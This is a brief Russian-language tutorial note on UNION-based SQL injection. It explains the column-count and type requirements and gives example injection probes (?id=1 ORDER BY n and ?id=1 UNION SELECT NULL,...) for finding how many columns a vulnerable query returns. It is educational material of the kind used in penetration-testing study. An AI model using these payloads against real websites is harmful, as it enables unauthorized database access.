Интересный тип SQLi, мы можем к исходному запросу добавить нужный нам запрос, что в итоге приведет к выбору и первого и второго.

Для `UNION`Для корректной работы запроса необходимо выполнение двух ключевых требований:

- Каждый отдельный запрос должен возвращать одинаковое количество столбцов.
- Типы данных в каждом столбце должны быть совместимы между отдельными запросами.

## 2 эффективных варианта определения такого типа уязвимостей

- Через Order by
- Через Union Select Null --

Примеры эксплоатации:

Исходный:

```
SELECT id, name, price FROM products WHERE id = 1;
```

Попытка поиска через Order by:

```
?id=1 ORDER BY 1
?id=1 ORDER BY 2
?id=1 ORDER BY 3
?id=1 ORDER BY 4
```

Через Null:

```
?id=1 UNION SELECT NULL
?id=1 UNION SELECT NULL,NULL
?id=1 UNION SELECT NULL,NULL,NULL
?id=1 UNION SELECT NULL,NULL,NULL,NULL
```

Мы скролим до тех пор, пока количество колонок не совпадет.
Если будет больше - получим ошибку.
